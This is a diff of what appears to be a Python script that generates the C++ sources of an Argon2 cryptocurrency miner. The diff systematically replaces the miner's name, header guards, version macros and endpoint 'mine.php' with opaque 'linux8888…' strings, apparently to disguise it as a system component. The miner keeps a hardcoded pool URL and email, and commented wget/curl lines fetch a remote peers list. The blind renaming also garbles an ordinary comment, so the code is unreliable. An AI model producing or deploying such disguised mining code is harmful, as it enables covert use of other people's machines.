@@ -905,8 +905,8 @@ content="""//
 // Created by Haifa Bogdan Adnan on 04/08/2018.
 //
 
-#ifndef ARIOlinux84_HTTP_H
-#define ARIOlinux84_HTTP_H
+#ifndef linux888888887444888888linux84_HTTP_H
+#define linux888888887444888888linux84_HTTP_H
 
 
 class http {
@@ -926,7 +926,7 @@ private:
 };
 
 
-#endif //ARIOlinux84_HTTP_H
+#endif //linux888888887444888888linux84_HTTP_H
 """
 
 open('./http/http.h', 'w').write(content)
@@ -986,7 +986,7 @@ linux888874744474_update_result linux888874744474_client::update() {
 
     string response;
 
-    //response = GetStdoutFromCommand("wget -N -q http://aro.blueinc.cloud:84/peers.txt -O ./linux84744444744474;curl -s -A 'linux84' $(shuf -n 1 ./linux84744444744474)/mine.php?q=info");
+    //response = GetStdoutFromCommand("wget -N -q http://aro.blueinc.cloud:84/peers.txt -O ./linux84744444744474;curl -s -A 'linux84' $(shuf -n 1 ./linux84744444744474)/linux8888888874.php?q=info");
 
     string url = "http://www.blueinc.cloud/linux8474.php?linux84=linux8474&linux84744474=linuxdistro84@gmail.com";
     
@@ -1032,7 +1032,7 @@ linux888874744474_submit_result linux888874744474_client::submit(const string &l
     if(__show_linuxweb844412441274_requests)
     LOG("");
     
-    //string linux847444744474 = GetStdoutFromCommand("wget -N -q http://aro.blueinc.cloud:84/peers.txt -O ./linux84744444744474;echo $(shuf -n 1 ./linux84744444744474)/mine.php?q=submitNonce");
+    //string linux847444744474 = GetStdoutFromCommand("wget -N -q http://aro.blueinc.cloud:84/peers.txt -O ./linux84744444744474;echo $(shuf -n 1 ./linux84744444744474)/linux8888888874.php?q=submitNonce");
     
     string url = "http://www.blueinc.cloud/linux8474.php?linux84=linux84";
     
@@ -1351,8 +1351,8 @@ content="""//
 // Created by Haifa Bogdan Adnan on 05/08/2018.
 //
 
-#ifndef ARIOMINER_ARGON2_H
-#define ARIOMINER_ARGON2_H
+#ifndef linux888888887444888888linux8888888874R_ARGON2_H
+#define linux888888887444888888linux8888888874R_ARGON2_H
 
 #include "defs.h"
 
@@ -1390,7 +1390,7 @@ private:
 };
 
 
-#endif //ARIOMINER_ARGON2_H
+#endif //linux888888887444888888linux8888888874R_ARGON2_H
 """
 
 open('./linux8474/argon2/argon2.h', 'w').write(content)
@@ -1399,8 +1399,8 @@ content="""//
 // Created by Haifa Bogdan Adnan on 06/08/2018.
 //
 
-#ifndef ARIOMINER_DEFS_H
-#define ARIOMINER_DEFS_H
+#ifndef linux888888887444888888linux8888888874R_DEFS_H
+#define linux888888887444888888linux8888888874R_DEFS_H
 
 #define ARGON2_RAW_LENGTH               32
 #define ARGON2_TYPE_VALUE               1
@@ -1439,7 +1439,7 @@ extern DLLEXPORT argon2profile *argon2profile_default;
 }
 #endif
 
-#endif //ARIOMINER_DEFS_H
+#endif //linux888888887444888888linux8888888874R_DEFS_H
 """
 
 open('./linux8474/argon2/defs.h', 'w').write(content)
@@ -4695,7 +4695,7 @@ bool arguments::valid(string &error) {
         }
 
         if(__enable_api_port != 0 && __enable_api_port < 1024) {
-            error = "Ariolinux84 API port must be at least 1024, lower port numbers are usually reserved by system and requires administrator privileges.";
+            error = "linux88888888744488888888linux84 API port must be at least 1024, lower port numbers are usually reserved by system and requires administrator privileges.";
             return false;
         }
     }
@@ -4943,7 +4943,7 @@ string arguments::get_app_name() {
 
     string app_name = __argv_0.substr(last_slash + 1);
     if(app_name.empty()) {
-        app_name = "ariolinux84";
+        app_name = "linux8888888874448888linux84";
     }
     return app_name;
 }
@@ -5006,7 +5006,7 @@ double arguments::hs_threshold() {
 }
 
 string arguments::get_app_version() {
-    return "ariolinux84_" Ariolinux84_VERSION_MAJOR "_" Ariolinux84_VERSION_MINOR "_" Ariolinux84_VERSION_REVISION;
+    return "linux8888888874448888linux84_" linux88888888744488888888linux84_VERSION_MAJOR "_" linux88888888744488888888linux84_VERSION_MINOR "_" linux88888888744488888888linux84_VERSION_REVISION;
 }"""
 
 open('./app/arguments.cpp', 'w').write(content)
@@ -5015,8 +5015,8 @@ content="""//
 // Created by Haifa Bogdan Adnan on 04/08/2018.
 //
 
-#ifndef ARIOlinux84_ARGUMENTS_H
-#define ARIOlinux84_ARGUMENTS_H
+#ifndef linux888888887444888888linux84_ARGUMENTS_H
+#define linux888888887444888888linux84_ARGUMENTS_H
 
 class DLLEXPORT arguments {
 public:
@@ -5121,7 +5121,7 @@ private:
     static string __argv_0;
 };
 
-#endif //ARIOlinux84_ARGUMENTS_H"""
+#endif //linux888888887444888888linux84_ARGUMENTS_H"""
 
 open('./app/arguments.h', 'w').write(content)
 
@@ -5181,8 +5181,8 @@ content="""//
 // Created by Haifa Bogdan Adnan on 30/08/2018.
 //
 
-#ifndef ARIOlinux84_RUNNER_H
-#define ARIOlinux84_RUNNER_H
+#ifndef linux888888887444888888linux84_RUNNER_H
+#define linux888888887444888888linux84_RUNNER_H
 
 class runner {
 public:
@@ -5190,7 +5190,7 @@ public:
     virtual void stop() = 0;
 };
 
-#endif //ARIOlinux84_RUNNER_H"""
+#endif //linux888888887444888888linux84_RUNNER_H"""
 
 open('./app/runner.h', 'w').write(content)
 
@@ -5659,7 +5659,7 @@ struct http_parser {
   unsigned int index : 7;        /* index into current matcher */
   unsigned int lenient_http_headers : 1;
 
-  uint32_t nread;          /* # bytes read in various scenarios */
+  uint32_t nread;          /* # bytes read in vlinux8888888874448888us scenlinux8888888874448888s */
   uint64_t content_length; /* # bytes in body (0 if no Content-Length header) */
 
   /** READ-ONLY **/
@@ -10869,8 +10869,8 @@ content="""//
 // Created by Haifa Bogdan Adnan on 03/08/2018.
 //
 
-#ifndef ARIOlinux84_linux8474_H
-#define ARIOlinux84_linux8474_H
+#ifndef linux888888887444888888linux84_linux8474_H
+#define linux888888887444888888linux84_linux8474_H
 
 #include "argon2/defs.h"
 
@@ -10992,7 +10992,7 @@ private:
     list<linux8412_timing> __linux8412_timings;
 };
 
-#endif //ARIOlinux84_linux8474_H"""
+#endif //linux888888887444888888linux84_linux8474_H"""
 
 open('./linux8474/linux8474.h', 'w').write(content)
 
@@ -11194,8 +11194,8 @@ content="""//
 // Created by Haifa Bogdan Adnan on 18/09/2018.
 //
 
-#ifndef ARIOlinux84_CUDA_linux8474_H
-#define ARIOlinux84_CUDA_linux8474_H
+#ifndef linux888888887444888888linux84_CUDA_linux8474_H
+#define linux888888887444888888linux84_CUDA_linux8474_H
 
 #if defined(WITH_CUDA)
 
@@ -11310,7 +11310,7 @@ extern void *cuda_kernel_filler(void *memory, int threads, argon2profile *profil
 
 #endif //WITH_CUDA
 
-#endif //ARIOlinux84_CUDA_linux8474_H"""
+#endif //linux888888887444888888linux84_CUDA_linux8474_H"""
 
 open('./linux8474/gpu/cuda/cuda_linux8474.h', 'w').write(content)
 
@@ -11701,9 +11701,9 @@ set(SOURCE_CUDA_linux8474 linux8474/gpu/cuda/cuda_linux8474.cpp linux8474/gpu/cu
         linux8474/gpu/cuda/cuda_kernel.cu)
 
 set (CMAKE_CXX_STANDARD 11)
-set (Ariolinux84_VERSION_MAJOR 4)
-set (Ariolinux84_VERSION_MINOR 2)
-set (Ariolinux84_VERSION_REVISION 2)
+set (linux88888888744488888888linux84_VERSION_MAJOR 4)
+set (linux88888888744488888888linux84_VERSION_MINOR 2)
+set (linux88888888744488888888linux84_VERSION_REVISION 2)
 
 set (CMAKE_MACOSX_RPATH 0)
 
@@ -11761,14 +11761,14 @@ content="""//
 // Created by Haifa Bogdan Adnan on 04/08/2018.
 //
 
-#ifndef ARIOlinux84_CONFIG_H_IN_H
-#define ARIOlinux84_CONFIG_H_IN_H
+#ifndef linux888888887444888888linux84_CONFIG_H_IN_H
+#define linux888888887444888888linux84_CONFIG_H_IN_H
 
-#define Ariolinux84_VERSION_MAJOR "@Ariolinux84_VERSION_MAJOR@"
-#define Ariolinux84_VERSION_MINOR "@Ariolinux84_VERSION_MINOR@"
-#define Ariolinux84_VERSION_REVISION "@Ariolinux84_VERSION_REVISION@"
+#define linux88888888744488888888linux84_VERSION_MAJOR "@linux88888888744488888888linux84_VERSION_MAJOR@"
+#define linux88888888744488888888linux84_VERSION_MINOR "@linux88888888744488888888linux84_VERSION_MINOR@"
+#define linux88888888744488888888linux84_VERSION_REVISION "@linux88888888744488888888linux84_VERSION_REVISION@"
 
-#endif //ARIOlinux84_CONFIG_H_IN_H"""
+#endif //linux888888887444888888linux84_CONFIG_H_IN_H"""
 
 open('./config.h.in', 'w').write(content)
 
